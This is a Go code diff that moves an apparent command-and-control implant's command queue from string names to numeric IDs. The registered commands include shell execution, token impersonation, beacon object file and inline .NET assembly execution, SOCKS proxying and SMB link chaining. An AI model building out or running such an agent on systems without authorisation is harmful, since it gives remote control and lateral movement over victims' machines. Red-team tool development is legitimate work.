@@ -46,7 +46,8 @@ var (
 type CommandQueue struct {
 	mu              sync.Mutex
 	commands        []Command
-	cmdRegistry     map[string]CommandInterface
+	cmdHandlers     map[int]CommandHandler          // New: numeric ID dispatch
+	cmdRegistry     map[string]CommandInterface     // Deprecated: kept for compatibility
 	cmdContext      *CommandContext
 	activeDownloads map[string]*DownloadInfo
 	activeUploads   map[string]*UploadInfo
@@ -67,57 +68,68 @@ func NewCommandQueue() *CommandQueue {
 
 	queue := &CommandQueue{
 		commands:        make([]Command, 0, 10),
-		cmdRegistry:     make(map[string]CommandInterface, 32),
+		cmdHandlers:     make(map[int]CommandHandler, 40),     // Numeric ID handlers
+		cmdRegistry:     make(map[string]CommandInterface, 40), // Deprecated: kept for compatibility
 		cmdContext:      ctx,
 		activeDownloads: make(map[string]*DownloadInfo, 4),
 		activeUploads:   make(map[string]*UploadInfo, 4),
 		activeJobs:      make(map[string]JobInfo, 8),
 	}
 
-	// Register all commands - these are defined in action_*.go files
-	queue.RegisterCommand(&CdCommand{})
-	queue.RegisterCommand(&LsCommand{})
-	queue.RegisterCommand(&PwdCommand{})
-	queue.RegisterCommand(&CatCommand{})
-	queue.RegisterCommand(&ShellCommand{})
-	queue.RegisterCommand(&WhoamiCommand{})
-	queue.RegisterCommand(&ExitCommand{})
-	queue.RegisterCommand(&SleepCommand{})
-	queue.RegisterCommand(&EnvCommand{})
-	queue.RegisterCommand(&PSCommand{})
-	queue.RegisterCommand(&RmCommand{})
-	queue.RegisterCommand(&HashCommand{})
-	queue.RegisterCommand(&HashDirCommand{})
-	queue.RegisterCommand(&DownloadCommand{})
-	queue.RegisterCommand(&UploadCommand{})
-	queue.RegisterCommand(&SocksCommand{})
-	queue.RegisterCommand(&JobKillCommand{})
-	queue.RegisterCommand(&TokenCommand{})
-	queue.RegisterCommand(&Rev2SelfCommand{})
-	queue.RegisterCommand(&BOFCommand{})
-	queue.RegisterCommand(&BOFAsyncCommand{})
-	queue.RegisterCommand(&BOFJobsCommand{})
-	queue.RegisterCommand(&BOFOutputCommand{})
-	queue.RegisterCommand(&BOFKillCommand{})
-	queue.RegisterCommand(&InlineAssemblyJobsCommand{})
-	queue.RegisterCommand(&InlineAssemblyOutputCommand{})
-	queue.RegisterCommand(&InlineAssemblyKillCommand{})
-	queue.RegisterCommand(&InlineAssemblyJobsCleanCommand{})
-	queue.RegisterCommand(&InlineAssemblyJobsStatsCommand{})
-	queue.RegisterCommand(&InlineAssemblyCommand{})
-	queue.RegisterCommand(&InlineAssemblyAsyncCommand{})
+	// Register all commands using numeric IDs
+	// Cross-platform commands (SMB_Windows subset)
+	queue.RegisterHandler(CmdCd, wrapCommand(&CdCommand{}))
+	queue.RegisterHandler(CmdLs, wrapCommand(&LsCommand{}))
+	queue.RegisterHandler(CmdPwd, wrapCommand(&PwdCommand{}))
+	queue.RegisterHandler(CmdDownload, wrapCommand(&DownloadCommand{}))
+	queue.RegisterHandler(CmdUpload, wrapCommand(&UploadCommand{}))
+	queue.RegisterHandler(CmdShell, wrapCommand(&ShellCommand{}))
+	queue.RegisterHandler(CmdSocks, wrapCommand(&SocksCommand{}))
+	queue.RegisterHandler(CmdJobkill, wrapCommand(&JobKillCommand{}))
+	queue.RegisterHandler(CmdExit, wrapCommand(&ExitCommand{}))
+	queue.RegisterHandler(CmdSleep, wrapCommand(&SleepCommand{}))
+	queue.RegisterHandler(CmdEnv, wrapCommand(&EnvCommand{}))
+	queue.RegisterHandler(CmdCat, wrapCommand(&CatCommand{}))
+	queue.RegisterHandler(CmdHash, wrapCommand(&HashCommand{}))
+	queue.RegisterHandler(CmdHashDir, wrapCommand(&HashDirCommand{}))
+	queue.RegisterHandler(CmdPs, wrapCommand(&PSCommand{}))
+	queue.RegisterHandler(CmdRm, wrapCommand(&RmCommand{}))
+	queue.RegisterHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
 
-	// Link commands for SMB chaining (SMB -> SMB -> SMB)
-	queue.RegisterCommand(&LinkCommand{})
-	queue.RegisterCommand(&UnlinkCommand{})
-	queue.RegisterCommand(&LinksCommand{})
+	// Windows specific commands
+	queue.RegisterHandler(CmdToken, wrapCommand(&TokenCommand{}))
+	queue.RegisterHandler(CmdRev2self, wrapCommand(&Rev2SelfCommand{}))
+	queue.RegisterHandler(CmdBof, wrapCommand(&BOFCommand{}))
+	queue.RegisterHandler(CmdBofAsync, wrapCommand(&BOFAsyncCommand{}))
+	queue.RegisterHandler(CmdBofJobs, wrapCommand(&BOFJobsCommand{}))
+	queue.RegisterHandler(CmdBofOutput, wrapCommand(&BOFOutputCommand{}))
+	queue.RegisterHandler(CmdBofKill, wrapCommand(&BOFKillCommand{}))
+	queue.RegisterHandler(CmdInlineAssembly, wrapCommand(&InlineAssemblyCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyAsync, wrapCommand(&InlineAssemblyAsyncCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyJobs, wrapCommand(&InlineAssemblyJobsCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyOutput, wrapCommand(&InlineAssemblyOutputCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyKill, wrapCommand(&InlineAssemblyKillCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyJobsClean, wrapCommand(&InlineAssemblyJobsCleanCommand{}))
+	queue.RegisterHandler(CmdInlineAssemblyJobsStats, wrapCommand(&InlineAssemblyJobsStatsCommand{}))
+
+	// SMB Link commands
+	queue.RegisterHandler(CmdLink, wrapCommand(&LinkCommand{}))
+	queue.RegisterHandler(CmdUnlink, wrapCommand(&UnlinkCommand{}))
+	queue.RegisterHandler(CmdLinks, wrapCommand(&LinksCommand{}))
 
 	return queue
 }
 
-// RegisterCommand adds a command to the registry
-func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
-	cq.cmdRegistry[cmd.Name()] = cmd
+// RegisterHandler registers a command handler by numeric ID
+func (cq *CommandQueue) RegisterHandler(id int, handler CommandHandler) {
+	cq.cmdHandlers[id] = handler
+}
+
+// wrapCommand converts a CommandInterface to a CommandHandler function
+func wrapCommand(cmd CommandInterface) CommandHandler {
+	return func(ctx *CommandContext, args []string) CommandResult {
+		return cmd.Execute(ctx, args)
+	}
 }
 
 // AddCommands parses and adds commands to the queue
@@ -154,10 +166,10 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// Apply session environment variables
 	cq.applySessionEnvironment()
 
-	// Handle inline-assembly job management commands FIRST
-	if cmd.Command == cqCmdInlineAssemblyJobs {
-		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobs]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+	// Handle inline-assembly job management commands FIRST (by numeric ID)
+	if cmd.CommandType == CmdInlineAssemblyJobs {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -172,14 +184,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-clean command
-	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyJobsClean) {
+	if cmd.CommandType == CmdInlineAssemblyJobsClean {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobsClean]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -187,9 +199,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-stats command
-	if cmd.Command == cqCmdInlineAssemblyJobsStats {
-		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyJobsStats]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+	if cmd.CommandType == CmdInlineAssemblyJobsStats {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -197,14 +209,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-output command WITH arguments
-	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyOutputSp) {
+	if cmd.CommandType == CmdInlineAssemblyOutput {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyOutput]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -212,14 +224,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-kill command WITH arguments
-	if strings.HasPrefix(cmd.Command, cqCmdInlineAssemblyKillSp) {
+	if cmd.CommandType == CmdInlineAssemblyKill {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cqCmdInlineAssemblyKill]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
 			args := []string{}
 			if len(parts) > 1 {
 				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -227,17 +239,13 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly commands WITH data (actual assembly execution)
-	if strings.HasPrefix(cmd.Command, cqCmdInlineAssembly) && cmd.Data != "" {
+	if (cmd.CommandType == CmdInlineAssembly || cmd.CommandType == CmdInlineAssemblyAsync) && cmd.Data != "" {
 		var testParse map[string]interface{}
 		_ = json.Unmarshal([]byte(cmd.Data), &testParse)
 
-		handlerName := cqCmdInlineAssembly
-		if strings.Contains(cmd.Command, cqWordAsync) {
-			handlerName = cqCmdInlineAssemblyAsync
-		}
-
-		if handler, exists := cq.cmdRegistry[handlerName]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+		handlerID := cmd.CommandType
+		if handler, exists := cq.cmdHandlers[handlerID]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -252,7 +260,7 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle upload chunks
-	if cmd.Command == cqCmdUpload && cmd.Data != "" {
+	if cmd.CommandType == CmdUpload && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &CommandResult{
@@ -267,13 +275,13 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle async BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, cqCmdBofAsync) && cmd.Data != "" {
+	if cmd.CommandType == CmdBofAsync && cmd.Data != "" {
 		result := cq.processBOFAsync(cmd)
 		return &result, nil
 	}
 
 	// Handle regular BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, cqCmdBof) && cmd.Data != "" {
+	if cmd.CommandType == CmdBof && cmd.Data != "" {
 		result := cq.processBOF(cmd)
 		return &result, nil
 	}
@@ -341,15 +349,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		}, nil
 	}
 
-	cmdType := args[0]
 	cmdArgs := args[1:]
 
-	// Look up command handler
-	if handler, exists := cq.cmdRegistry[cmdType]; exists {
-		result := handler.Execute(cq.cmdContext, cmdArgs)
+	// Look up command handler by numeric ID
+	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
+		result := handler(cq.cmdContext, cmdArgs)
 
 		// For file operations, preserve data from handler
-		if (cmdType == cqCmdDownload || cmdType == cqCmdUpload) &&
+		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
 			(result.Command.Filename != "" || result.Command.Data != "") {
 			result.Command.CommandID = cmd.CommandID
 			result.Command.CommandDBID = cmd.CommandDBID
